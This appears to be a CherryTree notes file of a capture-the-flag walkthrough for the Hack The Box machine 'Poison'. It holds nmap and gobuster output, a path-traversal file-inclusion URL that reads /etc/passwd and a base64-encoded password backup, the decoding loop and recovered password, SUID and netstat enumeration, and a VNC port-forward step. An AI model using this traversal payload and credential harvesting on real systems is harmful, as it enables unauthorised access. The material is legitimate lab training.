<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="10.10.10.84" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1675519371">
    <rich_text>IP :10.10.10.84
Hostname:
OS:





Linux Proof: </rich_text>
    <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
    <rich_text>
Windows Proof: </rich_text>
    <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
    <rich_text>
</rich_text>
    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1707163259">
      <node name="nmap" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1707158147" ts_lastsave="1707158498">
        <rich_text></rich_text>
        <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">                                                                                                                                                                        
 Writeups  ./nmapScanTCPPn.sh 10.10.10.84 HTB/Poison/nmap/nmapAllTCPPn.log
USAGE: ./nmapScanTCPPn.sh &lt;inputip&gt; &lt;outputfile&gt;

the ports found are: 22,80
HTB/Poison/nmap/nmapAllTCPPn.log
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-05 13:40 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Initiating Ping Scan at 13:40
Scanning 10.10.10.84 [2 ports]
Completed Ping Scan at 13:40, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.00s elapsed
Initiating Connect Scan at 13:40
Scanning 10.10.10.84 (10.10.10.84) [2 ports]
Discovered open port 80/tcp on 10.10.10.84
Discovered open port 22/tcp on 10.10.10.84
Completed Connect Scan at 13:40, 0.10s elapsed (2 total ports)
Initiating Service scan at 13:40
Scanning 2 services on 10.10.10.84 (10.10.10.84)
Completed Service scan at 13:40, 6.25s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.84.
Initiating NSE at 13:40
Completed NSE at 13:40, 3.60s elapsed
Initiating NSE at 13:40
Completed NSE at 13:40, 0.42s elapsed
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Nmap scan report for 10.10.10.84 (10.10.10.84)
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

NSE: Script Post-scanning.
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Initiating NSE at 13:40
Completed NSE at 13:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect resu</codebox>
      </node>
      <node name="lfi" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1707158784" ts_lastsave="1707163040">
        <rich_text>direcoty bf


gives us the following




we see the main functionality helps to view files
 so i tried lfi and got the following output
</rich_text>
        <rich_text link="webs http://10.10.10.84/browse.php?file=../../../../../../etc/passwd">http://10.10.10.84/browse.php?file=../../../../../../etc/passwd</rich_text>
        <rich_text>





from the main page we also find the following file



on visiting it we see the following



so we use the lfi to view this file, </rich_text>
        <rich_text family="monospace">pwdbackup.txt</rich_text>
        <rich_text>,  via:




and we get the following output:


so we used the following command




to get thje following output




using the password we were able to login
</rich_text>
        <codebox char_offset="38" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">                                                                                                                                                                            
 Poison  gobuster dir -e -u http://10.10.10.84 -w /usr/share/wordlists/dirb/big.txt -t 20 -o DirectoryBF/gobuster.log
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.84
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.10.84/.htpasswd            (Status: 403) [Size: 218]
http://10.10.10.84/.htaccess            (Status: 403) [Size: 218]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
</codebox>
        <codebox char_offset="203" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">root:*:0:0:Charlie &amp;amp;:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &amp;amp;:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
_ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
_tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
charix:*:1001:1001:charix:/home/charix:/bin/csh</codebox>
        <codebox char_offset="259" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">http://10.10.10.84/listfiles.php</codebox>
        <codebox char_offset="298" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; browse.php [3] =&gt; index.php [4] =&gt; info.php [5] =&gt; ini.php [6] =&gt; listfiles.php [7] =&gt; phpinfo.php [8] =&gt; pwdbackup.txt ) </codebox>
        <codebox char_offset="361" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">http://10.10.10.84/browse.php?file=pwdbackup.txt</codebox>
        <codebox char_offset="398" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo= </codebox>
        <codebox char_offset="436" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">                                                                                                                                                                            
 Poison  data=$(cat pwd.b64); for i in $(seq 1 13); do data=$(echo $data | sed 's/ //g' | base64 -d); done; echo $data
</codebox>
        <codebox char_offset="469" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Charix!2#4%6&amp;8(0</codebox>
      </node>
      <node name="privesc" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1707163259" ts_lastsave="1707167759">
        <rich_text>we check the permissions via

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


nothing we find `secret.zip`  apparently its a vnc secret file
 
 
 on doing netstat we find the following :
 </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
 
 
 on googling i find its for vnc
 
 </rich_text>
        <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc">https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc</rich_text>
        <rich_text>
 
 
 so we port forward using:
 
 
 
 
 
 
 
 
 
 
 
 </rich_text>
        <codebox char_offset="30" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
charix@Poison:~ % find / -perm -u=s -type f 
/usr/sbin/traceroute6
/usr/sbin/authpf-noip
/usr/sbin/traceroute
/usr/sbin/timedc
/usr/sbin/authpf
/usr/sbin/ppp
/usr/libexec/dma-mbox-create
/usr/libexec/ulog-helper
/usr/libexec/ssh-keysign
/usr/bin/lpq
/usr/bin/rlogin
/usr/bin/lprm
/usr/bin/lpr
/usr/bin/at
/usr/bin/crontab
/usr/bin/atrm
/usr/bin/atq
/usr/bin/su
/usr/bin/chpass
/usr/bin/quota
/usr/bin/passwd
/usr/bin/opieinfo
/usr/bin/login
/usr/bin/batch
/usr/bin/opiepasswd
/usr/bin/lock
/usr/bin/rsh
find: /usr/local/etc/cups/ssl: Permission denied
/usr/local/bin/Xorg
/usr/local/libexec/dbus-daemon-launch-helper
find: /usr/local/var/db/tpm: Permission denied
find: /usr/local/var/lib/tpm: Permission denied
find: /root: Permission denied
find: /var/crash: Permission denied
find: /var/audit: Permission denied
find: /var/authpf: Permission denied
find: /var/cron: Permission denied
find: /var/run/ppp: Permission denied
find: /var/run/tpm: Permission denied
find: /var/run/cups/certs: Permission denied
find: /var/backups: Permission denied
find: /var/db/etcupdate/current/var/crash: Permission denied
find: /var/db/etcupdate/current/etc/ntp: Permission denied
find: /var/db/entropy: Permission denied
find: /var/db/ipf: Permission denied
find: /var/db/hyperv: Permission denied
find: /var/db/freebsd-update: Permission denied
find: /var/db/ntp: Permission denied
find: /var/heimdal: Permission denied
find: /var/cache/cups: Permission denied
find: /var/spool/clientmqueue: Permission denied
find: /var/spool/opielocks: Permission denied
find: /var/spool/dma: Permission denied
find: /var/spool/cups: Permission denied
find: /etc/ntp: Permission denied
/bin/rcp
/sbin/ping6
/sbin/poweroff
/sbin/mksnap_ffs
/sbin/shutdown
/sbin/ping
</codebox>
        <codebox char_offset="144" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ctive Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0     44 10.10.10.84.22         10.10.14.21.53150      ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
</codebox>
        <codebox char_offset="290" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">vncviewer localhost:5901 -passwd secret</codebox>
        <encoded_png char_offset="295" justification="left" link="">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LQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAIAWLQAAAABatAAAAABo0QIAAACgRQsAAACAFi0AAAAAWrQAAAAAaNECAAAAoEULAAAAgBYtAAAAAFq0AAAAAGjRAgAAAKBFCwAAAICWl4Xb/u4f/vlq6wEAAABch3kBAAAA0LJ/XsC3P/v6yusBAAAAXId5AQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAAQIsWAAAAAC1aAAAAALRoAQAAANCiBQAAAECLFgAAAAAtWgAAAAC0aAEAAADQogUAAABAixYAAAAALVoAAAAAtGgBAAAA0KIFAAAA